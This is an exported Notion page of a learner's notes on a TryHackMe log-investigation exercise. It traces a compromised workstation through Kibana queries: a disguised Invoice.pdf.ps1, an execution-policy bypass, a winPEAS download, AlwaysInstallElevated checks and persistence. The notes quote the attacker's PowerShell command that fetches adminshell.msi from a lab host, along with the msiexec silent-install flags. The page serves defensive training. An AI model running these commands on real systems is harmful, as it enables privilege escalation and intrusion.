<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Servidae</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.highlight-default_background {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="1915b2cc-075b-80fb-8af7-d7c07b4220b3" class="page sans"><header><h1 class="page-title">Servidae</h1><p class="page-description"></p></header><div class="page-body"><p id="1925b2cc-075b-8016-ad93-e5abc3f4ec36" class="">
</p><figure id="1925b2cc-075b-80ca-9ff1-de3e89c67b64" class="image"><a href="ED3A3D15-CF25-4D50-A848-038BEB86E4A8.png"><img style="width:709.9953002929688px" src="ED3A3D15-CF25-4D50-A848-038BEB86E4A8.png"/></a></figure><p id="1925b2cc-075b-8090-9805-fd34852250d1" class="">
</p><p id="1925b2cc-075b-8053-ad43-cd94e3990b7d" class="">For this thm excercise, i focus on the following attributes</p><ul id="1925b2cc-075b-80ab-a4ff-e9a839604530" class="bulleted-list"><li style="list-style-type:disc"><strong>agent.name</strong>: This field indicates the name of the software agent or workstation responsible for generating the log event.</li></ul><ul id="1925b2cc-075b-805b-b818-ebc7ad62b053" class="bulleted-list"><li style="list-style-type:disc"><strong>event.category</strong>: This field indicates the nature of events related to process execution or command-line activity.</li></ul><ul id="1925b2cc-075b-8098-91fd-d666b17454f9" class="bulleted-list"><li style="list-style-type:disc"><strong>process.command_line</strong>: This field captures the entire command-line string of the process. You can use this field to search for specific commands an attacker may have used.</li></ul><ul id="1925b2cc-075b-8094-b179-c59b2100bc3c" class="bulleted-list"><li style="list-style-type:disc"><strong>process.executable</strong>: This field captures the path or name of the executable file associated with a process.</li></ul><ul id="1925b2cc-075b-80d8-8322-e7a1eba3b868" class="bulleted-list"><li style="list-style-type:disc"><strong>process.name</strong>: This field captures the name of a process.</li></ul><ul id="1925b2cc-075b-8050-bbac-c192c7231e54" class="bulleted-list"><li style="list-style-type:disc"><strong>process.parent.name</strong>: This field captures the name of the parent process.</li></ul><ul id="1925b2cc-075b-807f-80f3-c78fc0e9044d" class="bulleted-list"><li style="list-style-type:disc"><strong>related.user: </strong>This field captures information about the user associated with an event, such as their username, ID, or other user-specific information.</li></ul><ul id="1925b2cc-075b-808a-8e8f-d4d675e4b5e6" class="bulleted-list"><li style="list-style-type:disc"><strong>source.ip</strong>: This field captures the source IP address associated with a network event.</li></ul><ul id="1925b2cc-075b-807a-9619-cf0c90977cde" class="bulleted-list"><li style="list-style-type:disc"><strong>destination.ip</strong>: This field captures the destination IP address associated with a network event.</li></ul><p id="1935b2cc-075b-8062-97ea-f388d891b6ff" class="">
</p><p id="1935b2cc-075b-80b9-a9e5-cd902e802b49" class="">TOP VALUES </p><p id="1935b2cc-075b-80ea-9c95-ca8cef4d2ffe" class="">dest IP</p><p id="1935b2cc-075b-80e4-9718-cd3743be2a44" class="">IP lookup</p><p id="1935b2cc-075b-8007-9734-e71d06682a35" class="">process name</p><p id="1945b2cc-075b-80b9-939a-c981f7295898" class="">
</p><p id="1945b2cc-075b-8033-840a-e9d68f55c177" class="">top destination ip - to check for any outstanding ip that may indicate a c2 server</p><p id="1935b2cc-075b-80a2-8f3b-ee2ec0163c34" class="">curl.exe - most ran process</p><p id="1945b2cc-075b-806c-b046-eac775e2e8d5" class="">process command line- shows commads run (this is done because we suspect that the maliocius document bill downloaded and ecevuted was a trojan)</p><p id="1945b2cc-075b-80e2-bf98-d11eebb8ee95" class="">filter usign “filter for field present” for showing only logs related to thsoe</p><p id="1945b2cc-075b-806f-adb0-f3ffa94cd425" class="">agent_name - ENdpooint name</p><p id="1945b2cc-075b-80eb-afc1-c1d6ac4d2f32" class="">related user - to drill down by user name</p><figure id="1945b2cc-075b-8066-8dfd-e591e473f144" class="image"><a href="8EB87FBF-296D-4940-B00A-3BABE6F98B05.png"><img style="width:709.9953002929688px" src="8EB87FBF-296D-4940-B00A-3BABE6F98B05.png"/></a></figure><p id="1945b2cc-075b-8023-b51c-db0acb91a443" class="">
</p><p id="1945b2cc-075b-805c-beb6-fb941675448c" class="">
</p><p id="1945b2cc-075b-807f-b582-cdc9e44bb934" class=""><mark class="highlight-orange_background">if((Get-ExecutionPolicy) -ne &#x27;AllSigned&#x27;) { Set-ExecutionPolicy -Scope Process Bypass }</mark></p><p id="1945b2cc-075b-8038-8b15-ff988d34b91c" class="">bypassing the execution policy </p><h3 id="1945b2cc-075b-80c6-b99e-cc98d7d42105" class=""><strong>Potential Security Concerns</strong></h3><p id="1945b2cc-075b-8004-90cb-f9e4a490f23e" class="">This command raises several red flags:</p><ol type="1" id="1945b2cc-075b-80ee-851f-c460a0d86ae2" class="numbered-list" start="1"><li><strong>Unusual File Name </strong>: The script is named <code><strong>Invoice.pdf.ps1</strong></code>. While it has a <code><strong>.ps1</strong></code> extension (indicating it is a PowerShell script), the <code><strong>.pdf</strong></code> part of the name is suspicious. This could imply that the file was disguised as a PDF to trick users into running it.</li></ol><ol type="1" id="1945b2cc-075b-8026-8509-edcbf292e21e" class="numbered-list" start="2"><li><strong>Execution Policy Bypass </strong>: The script explicitly bypasses the execution policy, which is often done by malicious actors to run scripts that would otherwise be blocked by stricter policies.</li></ol><ol type="1" id="1945b2cc-075b-8047-b933-f807d92857e6" class="numbered-list" start="3"><li><strong>Unknown Script Source </strong>: The script is located on the desktop (<code><strong>C:\Users\bsmith\Desktop\Invoice.pdf.ps1</strong></code>). If this script was downloaded from an untrusted source or received via email, it could be malicious.</li></ol><p id="1945b2cc-075b-8082-8380-df1d290766a0" class=""><mark class="highlight-blue_background">file extension spoofing</mark></p><p id="1945b2cc-075b-808e-9595-f96667e09236" class="">
</p><p id="1945b2cc-075b-8028-b501-f09e6f5cc12d" class="">PID,  process name all crucial.</p><p id="1945b2cc-075b-802d-8f68-dbbeb06f8d4a" class="">
</p><p id="1945b2cc-075b-800f-86ed-d33a3ca2bd31" class="">IOC DIscovery.</p><p id="1945b2cc-075b-804d-b7ad-d6105a87157c" class="">
</p><p id="1945b2cc-075b-80ee-965d-e40c3b2166ce" class=""><em><mark class="highlight-yellow"><code><strong><span style="border-bottom:0.05em solid">The </span></strong></code></mark></em><em><mark class="highlight-yellow"><code><strong><a href="https://attack.mitre.org/"><span style="border-bottom:0.05em solid">MITRE ATT&amp;CK</span></a></strong></code></mark></em><em><mark class="highlight-yellow"><code><strong><span style="border-bottom:0.05em solid"> (Adversarial Tactics, Techniques, and Common Knowledge) framework is a globally recognized knowledge base and matrix that provides a comprehensive and structured catalogue of adversary behaviours and techniques. It is designed to help organizations understand, categorize, and mitigate the tactics and techniques used by threat actors during cyberattacks</span></strong></code></mark></em><br/><br/><strong>&quot;Discovery&quot; refers to the techniques and methods used by adversaries to gather information about the target environment, such as its network, systems, and user accounts. It involves activities that help the attackers better understand the victim&#x27;s infrastructure and identify potential vulnerabilities or opportunities for further exploitation.</strong></p><p id="1945b2cc-075b-80f3-9f95-d23dde1d3b2a" class="">
</p><figure id="1945b2cc-075b-802c-83d1-cae9a72c4f1b" class="image"><a href="image%20320.png"><img style="width:709.9669799804688px" src="image%20320.png"/></a></figure><p id="1945b2cc-075b-802f-b403-fb652df9fd48" class="">this is enumeration</p><p id="1945b2cc-075b-80be-90ef-d4d561d45cbd" class="">
</p><p id="1945b2cc-075b-80c6-833a-f4ba535979ab" class="">we see this as a very suspicious , as they were trying to download winepeas for enumeration </p><figure id="1945b2cc-075b-8016-8c9f-d473cd9d65ff" class="image"><a href="BD8DF448-04D9-42E0-9DF5-1F9F07578234.png"><img style="width:508.99530029296875px" src="BD8DF448-04D9-42E0-9DF5-1F9F07578234.png"/></a></figure><p id="1945b2cc-075b-8065-9bc1-e8a9fdab1a87" class="">
</p><p id="1945b2cc-075b-808c-a2bf-d4ece0c0f0c2" class=""> <mark class="highlight-default"><mark class="highlight-teal_background"><code><strong>Invoke-WebRequest</strong></code></mark></mark><mark class="highlight-default"><mark class="highlight-teal_background"><strong>  - </strong></mark></mark>The <strong>Invoke-WebRequest </strong>cmdlet retrieves data from a web server and can be used to download files, interact with REST APIs, and perform other HTTP/HTTPS operations. It can be used for legitimate purposes like the other commands we&#x27;ve covered. However, attackers can also use the Invoke-WebRequest cmdlet to <strong>download malicious files</strong> or <strong>exfiltrate data</strong> from a compromised system.<br/><br/></p><p id="1945b2cc-075b-8096-b1cc-c47fae8d6346" class="">\\</p><p id="1945b2cc-075b-80af-91ba-ed51b1c5763f" class=""><em><mark class="highlight-yellow">trying to run winpeas to get possible paths to privileage escalation</mark></em></p><p id="1945b2cc-075b-8098-9580-e45d4829c15f" class=""><em><mark class="highlight-yellow">Automated enumeration tools like winPEAS are quite common for an attacker to run (if they can get them on the compromised host without detection), and this is a very telling indicator of compromise on Bill&#x27;s workstation.</mark></em></p><p id="1945b2cc-075b-8054-bf66-e8a82b9e8b67" class="">
</p><p id="1945b2cc-075b-809e-aaed-f8ae1483c5d4" class=""><em><mark class="highlight-teal"><mark class="highlight-teal_background"><strong>Registry Queries</strong></mark></mark></em></p><figure id="1945b2cc-075b-8009-b3da-f105ffb75159" class="image"><a href="image%20321.png"><img style="width:709.9953002929688px" src="image%20321.png"/></a></figure><p id="1945b2cc-075b-8043-a8f4-c1b83d0c7ff2" class="">
</p><p id="1945b2cc-075b-8076-8235-ee089d127ae2" class="">the attacker is querying the registry to see if the <strong>AlwaysInstallElevated </strong>entry is set. This entry determines whether users can install programs or updates on the system with elevated privileges, which is a security risk if set without proper controls. This is a well-known <strong>privilege escalation</strong> method </p><p id="1945b2cc-075b-8023-b342-ff8f0077e95c" class="">
</p><p id="1945b2cc-075b-8000-ac6b-cbab7c4a8165" class=""><mark class="highlight-pink"><mark class="highlight-gray_background">IOC - PRIVILEGE ESCALATION</mark></mark></p><p id="1945b2cc-075b-80f8-860e-c6f1940cc08b" class="">
</p><p id="1945b2cc-075b-8078-8d6b-ea61ffa445ee" class="">In the context of MITRE ATT&amp;CK, &quot;<strong>Privilege Escalation</strong>&quot; refers to a tactic used by adversaries to <strong>obtain higher access privileges</strong> within a compromised system or network. It involves using techniques and exploiting misconfigurations to elevate privileges from the initial compromised state to gain more control and access to sensitive resources, data, or functionality.<br/><br/>since we know athat the user is trying to instal lsomething with elevated privileage, we can check for any .msi installer files</p><p id="1945b2cc-075b-808f-a080-f4c2cc4e5056" class="">
</p><p id="1945b2cc-075b-8089-9cc0-ea39f6feff3a" class="">so we kql to check through the process command line to look for any msi files</p><p id="1945b2cc-075b-8051-ad52-fda7d5b848e7" class=""><code>process.command_line: </code><em><code>msi</code></em></p><p id="1945b2cc-075b-802a-8504-fcd59f2e716a" class="">
</p><figure id="1945b2cc-075b-80a3-a497-fc865a89eb9f" class="image"><a href="image%20322.png"><img style="width:709.9528198242188px" src="image%20322.png"/></a></figure><p id="1945b2cc-075b-80b4-81cb-c830b25e7065" class="">download the file - powershell -c Invoke-WebRequest -Uri &quot;<a href="http://evilparrot.thm/adminshell.msi">http://evilparrot.thm/adminshell.msi</a>&quot; -OutFile &quot;adminshell.msi&quot;</p><p id="1945b2cc-075b-8090-bd19-c63e74d7f772" class="">isntall the file</p><p id="1945b2cc-075b-805d-9df5-fc69be99b709" class=""><mark class="highlight-pink"><strong>msiexec.exe</strong></mark><mark class="highlight-pink"> - the utility used to install .msi files</mark><br/>/qn flag is silent installation for msi</p><p id="1945b2cc-075b-800c-98ab-ddfa5e8adbf2" class="">/i flag is for normal installation of msi</p><p id="1945b2cc-075b-80db-8884-ffe57415f4f7" class="">
</p><p id="1945b2cc-075b-80d0-a097-e1afee87f8cb" class=""><br/></p><p id="1945b2cc-075b-809a-9804-ee2ead61d88b" class=""><em><mark class="highlight-orange"><style>@import url('https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css')</style><span data-token-index="0" contenteditable="false" class="notion-text-equation-token" style="user-select:all;-webkit-user-select:all;-moz-user-select:all"><span></span><span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>O</mi><mi>C</mi><mo>−</mo><mi>P</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">IOC - Persistence</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">ers</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span></span><span>﻿</span></span></mark></em></p><p id="1945b2cc-075b-80a5-a5ae-d114000b2f5d" class="">
</p><p id="1945b2cc-075b-80b5-9258-d06d159dcca0" class=""><mark class="highlight-gray"><mark class="highlight-blue_background">In the context of MITRE ATT&amp;CK, &quot;</mark></mark><mark class="highlight-gray"><mark class="highlight-blue_background"><strong>Persistence</strong></mark></mark><mark class="highlight-gray"><mark class="highlight-blue_background">&quot; refers to the tactics and techniques used by adversaries to maintain long-term access to a compromised system or network, even after initial access. After achieving elevated access on a compromised system, an attacker typically looks for ways to maintain their access and gain persistence.</mark></mark><br/><br/><mark class="highlight-pink"><strong>Gaining persistence typically involves establishing a foothold or a backdoor on the system, often through creating a new user account, modifying system settings or files, installing a rootkit, or scheduling a task.</strong></mark><br/><br/>when a process runs with elevated privileges, it typically runs in the context of the &quot;SYSTEM&quot; user account.</p><figure id="1945b2cc-075b-8041-84d3-e14a238c41af" class="image"><a href="image%20323.png"><img style="width:709.9528198242188px" src="image%20323.png"/></a></figure><p id="1945b2cc-075b-80dd-9412-d26e6889477a" class="">adding user for persistence ?</p><figure id="1945b2cc-075b-80c5-bb79-c7d647f554d0" class="image"><a href="image%20324.png"><img style="width:709.9953002929688px" 